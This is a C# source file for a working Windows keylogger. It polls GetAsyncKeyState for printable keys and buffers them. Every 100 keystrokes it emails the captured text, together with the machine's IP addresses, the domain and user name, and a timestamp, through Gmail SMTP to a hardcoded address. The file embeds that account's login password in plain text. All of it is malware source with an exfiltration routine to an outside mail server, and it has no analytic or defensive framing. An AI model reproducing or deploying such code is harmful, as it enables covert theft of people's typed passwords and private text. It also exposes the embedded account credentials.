using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace KeyConsole
{
    class Logger
    {
        [DllImport("User32")]
        private static extern int GetAsyncKeyState(Int32 i);

        private long numberOfKeystrokes;

        private string temp = "";
        public void Cycle()
        {
            while (true)
            {
                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState != 0)
                    {
                        Console.Write((char)i + ", ");
                        temp += (char)i + ", ";

                        numberOfKeystrokes++;

                        if (numberOfKeystrokes % 100 == 0)
                        {
                            SendNewMessage();
                        }
                    }
                    Thread.Sleep(1);
                }
            }
        }
        private void SendNewMessage()
        {
            string emailBody = "";

            string subject = "Message from keylogger";
            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (var adress in host.AddressList)
            {
                emailBody += "Address: " + adress + ", ";
            }
            emailBody += "\nUser: " + Environment.UserDomainName + " \\ " + Environment.UserName;
            emailBody += "\nHost " + host;
            emailBody += "\nTime: " + DateTime.Now.ToString() + "\n";
            emailBody += temp;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailMessage = new MailMessage
            {
                From = new MailAddress("petrnovak7100@gmail.com"),
                Subject = subject
            };
            mailMessage.To.Add("petrnovak7100@gmail.com");
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("petrnovak7100@gmail.com", "bagrbagrbagr");
            mailMessage.Body = emailBody;
            client.Send(mailMessage);
        }
    }
}
